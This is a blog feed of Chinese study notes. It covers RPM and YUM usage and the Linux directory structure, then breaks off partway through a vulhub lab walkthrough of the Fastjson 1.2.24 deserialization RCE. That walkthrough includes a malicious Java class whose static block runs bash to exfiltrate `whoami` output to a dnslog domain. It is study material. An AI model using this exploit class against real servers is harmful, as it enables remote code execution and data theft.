lynx</span><br></pre></td></tr></table></figure><h3 id="（6）查看一个已经安装软件的文档安装位置"><a href="#（6）查看一个已经安装软件的文档安装位置" class="headerlink" title="（6）查看一个已经安装软件的文档安装位置"></a>（6）查看一个已经安装软件的文档安装位置</h3><p>语法格式：rpm -qd 软件名<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qd lynx</span><br></pre></td></tr></table></figure><h3 id="（7）查看一下已安装软件所依赖的软件包及文件"><a href="#（7）查看一下已安装软件所依赖的软件包及文件" class="headerlink" title="（7）查看一下已安装软件所依赖的软件包及文件"></a>（7）查看一下已安装软件所依赖的软件包及文件</h3><p>语法格式：rpm -qR软件名<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qR rpm-python</span><br></pre></td></tr></table></figure><p>查询已安装软件的总结：对于一个软件包已经安装，我们可以把这一系列的参数组合起来用，比如rpm -qil<br>比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qil lynx</span><br></pre></td></tr></table></figure><h2 id="2、对于未安装的软件包的查看"><a href="#2、对于未安装的软件包的查看" class="headerlink" title="2、对于未安装的软件包的查看"></a>2、对于未安装的软件包的查看</h2><p>查看的前提是有一个.rpm的文件，也就是说对既有软件file.rpm的查看等</p><h3 id="（1）查看一个软件包的用途、版本等信息"><a href="#（1）查看一个软件包的用途、版本等信息" class="headerlink" title="（1）查看一个软件包的用途、版本等信息"></a>（1）查看一个软件包的用途、版本等信息</h3><p>语法：rpm -qpi file.rpm<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qpi lynx-2.8.5-23.i386.rpm</span><br></pre></td></tr></table></figure><h3 id="（2）查看一个软件包所包含的文件"><a href="#（2）查看一个软件包所包含的文件" class="headerlink" title="（2）查看一个软件包所包含的文件"></a>（2）查看一个软件包所包含的文件</h3><p>语法：rpm -qpl file.rpm<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qpl lynx-2.8.5-23.i386.rpm</span><br></pre></td></tr></table></figure><h3 id="（3）查看软件包的文档所在的位置"><a href="#（3）查看软件包的文档所在的位置" class="headerlink" title="（3）查看软件包的文档所在的位置"></a>（3）查看软件包的文档所在的位置</h3><p>语法：rpm -qpd file.rpm<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qpd lynx-2.8.5-23.i386.rpm</span><br></pre></td></tr></table></figure><h3 id="（4）查看一个软件包的配置文件"><a href="#（4）查看一个软件包的配置文件" class="headerlink" title="（4）查看一个软件包的配置文件"></a>（4）查看一个软件包的配置文件</h3><p>语法：rpm -qpc file.rpm<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qpc lynx-2.8.5-23.i386.rpm</span><br></pre></td></tr></table></figure><h3 id="（5）查看一个软件包的依赖关系"><a href="#（5）查看一个软件包的依赖关系" class="headerlink" title="（5）查看一个软件包的依赖关系"></a>（5）查看一个软件包的依赖关系</h3><p>语法：rpm -qpR file.rpm<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qpR yumex_0.42-3.0.fc4_noarch.rpm</span><br></pre></td></tr></table></figure><h2 id="3、软件包的安装、升级、删除等"><a href="#3、软件包的安装、升级、删除等" class="headerlink" title="3、软件包的安装、升级、删除等"></a>3、软件包的安装、升级、删除等</h2><h3 id="（1）安装和升级一个RPM包"><a href="#（1）安装和升级一个RPM包" class="headerlink" title="（1）安装和升级一个RPM包"></a>（1）安装和升级一个RPM包</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -vih file.rpm 注：这是用来安装一个新的rpm包的。</span><br><span class="line">[root@Kelemao /]# rpm -Uvh file.rpmp 注：这是用来升级一个rpm包的。</span><br></pre></td></tr></table></figure><p>如果有依赖关系的，请解决依赖关系，其实软件包管理器能很好的解决依赖关系。，如果在软件包管理器中也找不到依赖关系的包，那只能通过编译他所依赖的包来解决依赖关系，或者强制安装，语法结构：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -ivh file.rpm --nodeps --force</span><br><span class="line">[root@Kelemao /]# rpm -Uvh file.rpm --nodeps --force</span><br></pre></td></tr></table></figure><h3 id="（2）删除一个RPM包"><a href="#（2）删除一个RPM包" class="headerlink" title="（2）删除一个RPM包"></a>（2）删除一个RPM包</h3><p>首先要学会查询rpm包，请看前面的说明：[root@Kelemao &#x2F;]# rpm -e 软件包名<br>举例：要移除lync包，完整的操作是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -e lynx</span><br></pre></td></tr></table></figure><p>如果有依赖关系，也可以用–nodeps忽略依赖的检查来删除，但尽可能不要这么做，最好用软件包管理器system-config-packages来删除或者添加软件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -e lynx --nodeps</span><br></pre></td></tr></table></figure><h2 id="4、RPM验证与数字证书"><a href="#4、RPM验证与数字证书" class="headerlink" title="4、RPM验证与数字证书"></a>4、RPM验证与数字证书</h2><p>导入签名：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm --import 签名文件 举例：</span><br><span class="line">[root@Kelemao /]# rpm --import RPM-GPG-KEY</span><br><span class="line">[root@Kelemao /]#  rpm --import RPM-GPG-KEY-fedora</span><br></pre></td></tr></table></figure><p>RPM验证作用是使用&#x2F;var&#x2F;lib&#x2F;rpm下面的数据库内容来比较目前linux系统的环境下的所有软件文件，也就是说当你有数据不小心丢失，或者不小心修改到某个软件的文件内容，就用这个简单的方法验证一下原本的文件系统。</p><h2 id="5、从RPM软件包抽取文件"><a href="#5、从RPM软件包抽取文件" class="headerlink" title="5、从RPM软件包抽取文件"></a>5、从RPM软件包抽取文件</h2><p>命令格式：rpm2cpio file.rpm | cpio -div<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm2cpio gaim-1.3.0-1.fc4.i386.rpm |cpio -div</span><br></pre></td></tr></table></figure><p>抽取出来的文件就在操作目录中的usr和etc中，其实这样抽到文件不如指定安装目录来安装软件来的方便，也一样可以抽出文件，为软件包指定安装目录，要加-relocate参数。</p><h2 id="6、RPM的配置文件"><a href="#6、RPM的配置文件" class="headerlink" title="6、RPM的配置文件"></a>6、RPM的配置文件</h2><p>RPM包管理的配置文件是rpmrc，我们可以在自己的系统中找到，比如Fedora Core 4.0中的rpmrc文件位于：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@kelemap]# locate rpmrc</span><br><span class="line">/usr/lib/rpm/rpmrc</span><br><span class="line">/usr/lib/rpm/redhat/rpmrc</span><br></pre></td></tr></table></figure><h1 id="二、YUM"><a href="#二、YUM" class="headerlink" title="二、YUM"></a>二、YUM</h1><h2 id="1、YUM配置文件"><a href="#1、YUM配置文件" class="headerlink" title="1、YUM配置文件"></a>1、YUM配置文件</h2><h3 id="（1）创建容器，位置在-x2F-etc-x2F-yum-repos-d，扩展名必须是-repo"><a href="#（1）创建容器，位置在-x2F-etc-x2F-yum-repos-d，扩展名必须是-repo" class="headerlink" title="（1）创建容器，位置在&#x2F;etc&#x2F;yum.repos.d，扩展名必须是.repo"></a>（1）创建容器，位置在&#x2F;etc&#x2F;yum.repos.d，扩展名必须是.repo</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#cd /etc/yum.repos.d</span><br><span class="line">#vim yum.repo 新建一个仓库文件，名字可以随便定义，在文件中写如下内容</span><br><span class="line">[base] #代表容器名称，中括号一定要存在，里面的名字可随便取</span><br><span class="line">name=base #说明这个容器的意义，随便写都可以</span><br><span class="line">baseurl=ftp://192.168.0.6/pub/Server #192. 168. 0. 6 是你的 YUM 源地址，这个很重要。</span><br><span class="line">enabled=1 #是否启动，=0 则不启动，不启动就无法使用该源</span><br><span class="line">gpgcheck=0 #是否验证. 可不要</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release ＃验证的密钥. 可不要</span><br><span class="line">命令:#yum repolist all 显示目前所使用的容器有哪些</span><br><span class="line">如果查询出来的容器，status 为 disabled，要将配置文件，如上 enabled=1</span><br></pre></td></tr></table></figure><h3 id="（2）-x2F-etc-x2F-yum-conf"><a href="#（2）-x2F-etc-x2F-yum-conf" class="headerlink" title="（2）&#x2F;etc&#x2F;yum.conf"></a>（2）&#x2F;etc&#x2F;yum.conf</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">yum.conf 这个配置文件主要是 yum 客户端使用，里面主要规定了要去用的 rpm 包的 yum 服务器的信</span><br><span class="line">息。</span><br><span class="line">[main] #main 开头的块用于对客户端进行配置，在 main 后也可以指定 yum 源（不推荐这样做），与/etc/yum.repo.d 中指定 yum 源相同</span><br><span class="line">cachedir=/var/cache/yum</span><br><span class="line">#cachedir：yum 缓存的目录，yum 在此存储下载的 rpm 包和数据库，一般是/var/cache/yum。</span><br><span class="line">keepcache=0 #0 表示不保存下载的文件，1 表示保存下载的文件，默认为不保存</span><br><span class="line">debuglevel=2</span><br><span class="line">#debuglevel：除错级别，0──10,默认是 2 貌似只记录安装和删除记录</span><br><span class="line">logfile=/var/log/yum.log #指定 yum 的日志文件</span><br><span class="line">pkgpolicy=newest #包的策略，如果配置多了 yum 源，同一软件在不同的 yum 源中有不同版本，</span><br><span class="line">newest 则安装最新版本，该值为 lastest，则 yum 会将服务器上 ID 按照字母序排列，选择最后那个服务器上的软件安装</span><br><span class="line">distroverpkg=centos-release</span><br><span class="line">#指定一个软件包，yum 会根据这个包判断你的发行版本，默认是 redhat-release，也可以是安装的任何针对自己发行版的 rpm 包。</span><br><span class="line">tolerant=1</span><br><span class="line">#tolerent，也有 1 和 0 两个选项，表示 yum 是否容忍命令行发生与软件包有关的错误，比如你要安装1,2,3 三个包，而其中 3 此前已经安装了，如果你设为 1,则 yum 不会出现错误信息。默认是 0。</span><br><span class="line">exactarch=1</span><br><span class="line">#exactarch，有两个选项 1 和 0,代表是否只升级和你安装软件包 cpu 体系一致的包，如果设为 1，则如你安装了一个 i386 的 rpm，则 yum 不会用 i686 的包来升级。</span><br><span class="line">retries=20</span><br><span class="line">#retries，网络连接发生错误后的重试次数，如果设为 0，则会无限重试。</span><br><span class="line">obsoletes=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">#gpgchkeck= 有 1 和 0 两个选择，分别代表是否是否进行 gpg 校验，如果没有这一项，默认是检查的。</span><br><span class="line">plugins = 1 #是否启用插件，默认 1 为允许，0 表示不允许</span><br><span class="line">reposdir=/etc/yy.rm #默认是 /etc/yum.repos.d/ 低下的 xx.repo 后缀文件</span><br><span class="line">#默认都会被include 进来 也就是说 /etc/yum.repos.d/xx.repo 无论配置文件有多少个 每个里面有多少个[name]最后其实都被整合到 一个里面看就是了 重复的[name]应该是前面覆盖后面的--还是后面的覆盖前面的呢？enabled 测试是后面覆盖前面</span><br><span class="line">exclude=xxx</span><br><span class="line">#exclude 排除某些软件在升级名单之外，可以用通配符，列表中各个项目要用空格隔开，这个对于安装了诸如美化包，中文补丁的朋友特别有用。</span><br><span class="line">keepcache=[1 or 0]</span><br><span class="line">#设置 keepcache=1，yum 在成功安装软件包之后保留缓存的头文件 (headers) 和软件包。默认值为</span><br><span class="line">keepcache=0 不保存</span><br><span class="line">reposdir=[包含 .repo 文件的目录的绝对路径]</span><br><span class="line">#该选项用户指定 .repo 文件的绝对路径。.repo 文件包含软件仓库的信息 (作用与 /etc/yum.conf 文件</span><br><span class="line">中的 [repository] 片段相同)。</span><br></pre></td></tr></table></figure><h2 id="2、YUM命令"><a href="#2、YUM命令" class="headerlink" title="2、YUM命令"></a>2、YUM命令</h2><p>用YUM安装删除软件yum install xxx，yum会查询数据库，有无这一软件包，如果有，则检查其依赖冲突关系，如果没有依赖冲突，那么最好，下载安装，如果有，则会给出提出，询问是否要同时安装依赖，或删除冲突的包，可以自己做出判断，删除的命令是：yum remove xxx，同安装一样，yum也会查询数据库，给出解决依赖关系的提示。</p><h3 id="（1）YUM安装软件包"><a href="#（1）YUM安装软件包" class="headerlink" title="（1）YUM安装软件包"></a>（1）YUM安装软件包</h3><p>命令：yum install</p><h3 id="（2）YUM删除软件包"><a href="#（2）YUM删除软件包" class="headerlink" title="（2）YUM删除软件包"></a>（2）YUM删除软件包</h3><p>命令：yum remove<br>用YUM查询软件信息，我们常会碰到这样的情况，想要安装一个软件，只知道它和某方面有关，但又不能确切知道它的名字，这是yum的查询功能就起作用，可以用yum search keyword 这样的命令来进行搜索，比如我们要则安装一个instant messenger，但不知到底有哪些，这时不妨用yum search messenger这样的指令进行搜索，yum会搜索所有rpm的描述，列出所有描述中和messeger有关的rpm包，于是我们可能得到gaim，kopete等等，并从中选择，有时我们还会碰到安装了一个包，但又不知道其用途，我们可以用yum info packagename这个指令来获取信息。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.使用 YUM 查找软件包</span><br><span class="line">命令：yum search</span><br><span class="line">2.列出所有可安装的软件包</span><br><span class="line">命令：yum list</span><br><span class="line">3.列出所有可更新的软件包</span><br><span class="line">命令：yum list updates</span><br><span class="line">4.列出所有已安装的软件包</span><br><span class="line">命令：yum list installed</span><br><span class="line">5.列出所有已安装但不在 Yum Repository 內的软件包</span><br><span class="line">命令：yum list extras</span><br><span class="line">6.列出所指定的软件包</span><br><span class="line">命令：yum list</span><br><span class="line">7.使用 YUM 获取软件包信息</span><br><span class="line">命令：yum info</span><br><span class="line">8.列出所有软件包的信息</span><br><span class="line">命令：yum info</span><br><span class="line">9.列出所有可更新的软件包信息</span><br><span class="line">命令：yum info updates</span><br><span class="line">10.列出所有已安裝的软件包信息</span><br><span class="line">命令：yum info installed</span><br><span class="line">11.列出所有已安裝但不在 Yum Repository 內的软件包信息</span><br><span class="line">命令：yum info extras</span><br><span class="line">12.列出软件包提供哪些文件</span><br><span class="line">命令：yum provides </span><br></pre></td></tr></table></figure><h2 id="3、清除YUM缓存"><a href="#3、清除YUM缓存" class="headerlink" title="3、清除YUM缓存"></a>3、清除YUM缓存</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yum 会把下载的软件包和 header 存储在 cache 中，而不会自动删除。如果我们觉得它们占用了磁盘空间，</span><br><span class="line">可以使用 yum clean 指令进行清除，更精确的用法是 yum clean headers 清除 header，yum clean packages 清</span><br><span class="line">除下载的 rpm 包，yum clean all 一股脑儿端</span><br><span class="line">1.清除缓存目录(/var/cache/yum)下的软件包</span><br><span class="line">命令：yum clean packages</span><br><span class="line">2.清除缓存目录(/var/cache/yum)下的 headers</span><br><span class="line">命令：yum clean headers</span><br><span class="line">3.清除缓存目录(/var/cache/yum)下旧的 headers</span><br><span class="line">命令：yum clean</span><br><span class="line">Oldheaders</span><br><span class="line">4.清除缓存目录(/var/cache/yum)下的软件包及旧的 headers</span><br><span class="line">命令：yum clean, yum clean</span><br><span class="line">all (= yum clean packages; yum clean oldheaders)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（五）目录结构</title>
      <link href="/2021/10/10/linux_study_five/"/>
      <url>/2021/10/10/linux_study_five/</url>
      
        <content type="html"><![CDATA[<h1 id="目录结构及主要内容“-x2F-”根目录部分有以下子目录"><a href="#目录结构及主要内容“-x2F-”根目录部分有以下子目录" class="headerlink" title="目录结构及主要内容“&#x2F;”根目录部分有以下子目录"></a>目录结构及主要内容“&#x2F;”根目录部分有以下子目录</h1><h1 id="一、-x2F-usr目录"><a href="#一、-x2F-usr目录" class="headerlink" title="一、&#x2F;usr目录"></a>一、&#x2F;usr目录</h1><p>这个目录包含所有的命令、程序库、文档和其他文件。这些文件在正常操作中是不会被改变的，这个目录也包含你的Linux发行版本的主要的应用程序。</p><h1 id="二、-x2F-var目录"><a href="#二、-x2F-var目录" class="headerlink" title="二、&#x2F;var目录"></a>二、&#x2F;var目录</h1><p>这个目录包含在正常操作中被改变的文件：假脱机文件、记录文件、加锁文件、临时文件和页格式化文件等。这个目录中存放着那些不断在扩充着的东西，为了保持&#x2F;usr的相对稳定，那些经常被修改的目录可以放在这个目录下，实际上许多系统管理员都是这样干的，顺带说一下系统的日志文件就在&#x2F;var&#x2F;log目录中。</p><h1 id="三、-x2F-home目录"><a href="#三、-x2F-home目录" class="headerlink" title="三、&#x2F;home目录"></a>三、&#x2F;home目录</h1><p>这个目录包含用户的文件：参数设置文件、个性化文件、文档、数据、EMAIL、缓存数据等。这个目录在系统省级时应该保留。</p><h1 id="四、-x2F-proc目录"><a href="#四、-x2F-proc目录" class="headerlink" title="四、&#x2F;proc目录"></a>四、&#x2F;proc目录</h1><p>这个目录包含整个虚幻的文件，他们实际上并不存在磁盘上，也不占用任何空间，当查看这些文件时，实际上是在访问存在内存中的信息，这些信息用于访问系统。</p><h1 id="五、-x2F-bin目录"><a href="#五、-x2F-bin目录" class="headerlink" title="五、&#x2F;bin目录"></a>五、&#x2F;bin目录</h1><p>这个目录为系统启动时需要的执行文件，这些文件可以被普通用户使用。</p><h1 id="六、-x2F-sbin目录"><a href="#六、-x2F-sbin目录" class="headerlink" title="六、&#x2F;sbin目录"></a>六、&#x2F;sbin目录</h1><p>系统执行文件，这些文件不打算被普通用户使用。（普通用户仍然可以使用他们，但要指定目录。）</p><h1 id="七、-x2F-etc目录"><a href="#七、-x2F-etc目录" class="headerlink" title="七、&#x2F;etc目录"></a>七、&#x2F;etc目录</h1><p>操作系统的配置文件目录。</p><h1 id="八、-x2F-root目录"><a href="#八、-x2F-root目录" class="headerlink" title="八、&#x2F;root目录"></a>八、&#x2F;root目录</h1><p>系统管理员（也叫超级用户或根用户）的Home目录。</p><h1 id="九、-x2F-dev设备文件目录"><a href="#九、-x2F-dev设备文件目录" class="headerlink" title="九、&#x2F;dev设备文件目录"></a>九、&#x2F;dev设备文件目录</h1><p>Linux下设备被当成文件，这样一来硬件被抽象化，便于读写、网络共享以及需要临时装载到文件系统中，正常情况下，设备会有一个独立的子目录，这些设备的内容会出现在独立的子目录下，Linux没有所谓的驱动符。</p><h1 id="十、-x2F-lib目录"><a href="#十、-x2F-lib目录" class="headerlink" title="十、&#x2F;lib目录"></a>十、&#x2F;lib目录</h1><p>根文件系统目录下程序和核心模块的共享库</p><h1 id="十一、-x2F-boot目录"><a href="#十一、-x2F-boot目录" class="headerlink" title="十一、&#x2F;boot目录"></a>十一、&#x2F;boot目录</h1><p>用于自举加载程序的文件，当计算机启动时，这些文件首先被装载，这个目录也会包含Linux核，但Linux核也可以存在别处，只要配置LILO并且LILO知道Linux核在哪里。</p><h1 id="十二、-x2F-opt目录"><a href="#十二、-x2F-opt目录" class="headerlink" title="十二、&#x2F;opt目录"></a>十二、&#x2F;opt目录</h1><p>可选的应用程序。</p><h1 id="十三、-x2F-tmp目录"><a href="#十三、-x2F-tmp目录" class="headerlink" title="十三、&#x2F;tmp目录"></a>十三、&#x2F;tmp目录</h1><p>临时文件，该目录会被自动清理干净。</p><h1 id="十四、-x2F-lost-found"><a href="#十四、-x2F-lost-found" class="headerlink" title="十四、&#x2F;lost+found"></a>十四、&#x2F;lost+found</h1><p>在文件系统修复时恢复的文件</p><h1 id="十五、-x2F-usr目录"><a href="#十五、-x2F-usr目录" class="headerlink" title="十五、&#x2F;usr目录"></a>十五、&#x2F;usr目录</h1><p>目录下比较重要的部分有：<br>◆&#x2F;usr&#x2F;X11R6 X-WINDOWS 系统（version 11, release 6)<br>◆&#x2F;usr&#x2F;X11 同&#x2F;usr&#x2F;X11R6 （&#x2F;usr&#x2F;X11R6 的符号连接）<br>◆&#x2F;usr&#x2F;X11R6&#x2F;bin 大量的小 X-WINDOWS 应用程序（也可能是一些在其它子目录下大执行文件的符号连接）。<br>◆&#x2F;usr&#x2F;doc LINUX 的文档资料（在更新的系统中，这个目录移到&#x2F;usr&#x2F;share&#x2F;doc）。<br>◆&#x2F;usr&#x2F;share 独立与你计算机结构的数据，譬如，字典中的词。<br>◆&#x2F;usr&#x2F;bin 和&#x2F;usr&#x2F;sbin 类似与“&#x2F;”根目录下对应的目录（&#x2F;bin 和&#x2F;sbin），但不用于基本的启动（譬如，在紧急维护中）。大多数命令在这个目录下。<br>◆&#x2F;usr&#x2F;local 本地管理员安装的应用程序（也可能每个应用程序有单独的子目录）。在“main”安装后，这个目录可能是空的。这个目录下的内容在重安装或升级操作系统后应该存在。<br>◆&#x2F;usr&#x2F;local&#x2F;bin 可能是用户安装的小的应用程序，和一些在&#x2F;usr&#x2F;local 目录下大应用程序的符号连接。</p><h1 id="十六、-x2F-proc目录"><a href="#十六、-x2F-proc目录" class="headerlink" title="十六、&#x2F;proc目录"></a>十六、&#x2F;proc目录</h1><p>◆&#x2F;proc&#x2F;cpuinfo 关于处理器的信息，如类型、厂家、型号和性能等。<br>◆&#x2F;proc&#x2F;devices 当前运行内核所配置的所有设备清单。<br>◆&#x2F;proc&#x2F;dma 当前正在使用的 DMA 通道。&#x2F;proc&#x2F;filesystems 当前运行内核所配置的文件系统。<br>◆&#x2F;proc&#x2F;interrupts 正在使用的中断，和曾经有多少个中断。<br>◆&#x2F;proc&#x2F;ioports 当前正在使用的 I&#x2F;O 端口。</p><h1 id="十七、总结"><a href="#十七、总结" class="headerlink" title="十七、总结"></a>十七、总结</h1><p>◆用户应该将文件存在&#x2F;home&#x2F;user_login_name 目录下(及其子目录下)。<br>◆本地管理员大多数情况下将额外的软件安装在&#x2F;usr&#x2F;local 目录下并符号连接在&#x2F;usr&#x2F;local&#x2F;bin 下的主执行程序。<br>◆系统的所有设置在&#x2F;etc 目录下。<br>◆不要修改根目录（“&#x2F;”）或&#x2F;usr 目录下的任何内容，除非真的清楚要做什么。这些目录最好和 LINUX发布时保持一致。<br>◆大多数工具和应用程序安装在目录：&#x2F;bin, &#x2F;usr&#x2F;sbin, &#x2F;sbin, &#x2F;usr&#x2F;x11&#x2F;bin,&#x2F;usr&#x2F;local&#x2F;bin。<br>◆所有的文件在单一的目录树下。没有所谓的“驱动符”。</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>框架-中间件多学习（二）</title>
      <link href="/2021/10/08/framework_study_two/"/>
      <url>/2021/10/08/framework_study_two/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f84395e2b0984d6d9055ca7366d9b053-20230403125608406.png" alt="在这里插入图片描述"><br><strong>声明：本篇文章仅用于学习笔记记录，不得用于其他用途。</strong></p><h1 id="一、Fastjson"><a href="#一、Fastjson" class="headerlink" title="一、Fastjson"></a>一、Fastjson</h1><h2 id="1、1-2-24反序列化-rce"><a href="#1、1-2-24反序列化-rce" class="headerlink" title="1、1.2.24反序列化_rce"></a>1、1.2.24反序列化_rce</h2><h3 id="（1）漏洞介绍"><a href="#（1）漏洞介绍" class="headerlink" title="（1）漏洞介绍"></a>（1）漏洞介绍</h3><p>fastjson在解析json字符串的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。<br>###（2）漏洞产生的原因<br>通俗理解就是：漏洞是利用fastjson autotype在处理json字符串的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类(com.sun.rowset.JdbcRowSetImpl)连接远程rmi服务器，通过rmi服务器加载恶意类执行代码。</p><p>攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的权限，对服务器造成巨大的影响</p><p>补充：rmi 是一种协议，你可以简单的理解为 一台机器执行另一台机器给的命令<br>###（3）影响版本<br>Fastjson &lt;&#x3D; 1.2.24<br>###（4）环境搭建<br>cd  vulhub-master&#x2F;fastjson&#x2F;1.2.24-rce<br>docker-compose up -d<br>docker-compose down<br>###（5）漏洞复现<br>####a.安装javac环境<br>cd &#x2F;opt<br>curl <a href="http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz">http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz</a> -o jdk-8u20-linux-x64.tar.gz<br>tar zxvf jdk-8u20-linux-x64.tar.gz<br>ln -s &#x2F;opt&#x2F;jdk1.8.0_20&#x2F;bin&#x2F;java &#x2F;usr&#x2F;bin&#x2F;java8<br>ln -s &#x2F;opt&#x2F;jdk1.8.0_20&#x2F;bin&#x2F;javac &#x2F;usr&#x2F;bin&#x2F;javac8<br>javac8 -version<br>java8 -version<br>####b.获取一个dnslog域名<br>w08v5g.dnslog.cn</p><p>新建一个<code>poc.java</code>文件，编写恶意类 ， 这里使用dnslog进行数据外带</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="comment">// String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/dayutest&quot;&#125;;</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span> ,<span class="string">&quot;ping user.`whoami`.w08v5g.dnslog.cn -c 4&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<br>javac8 poc.java<br>搭建http服务传输恶意文件<br>python3 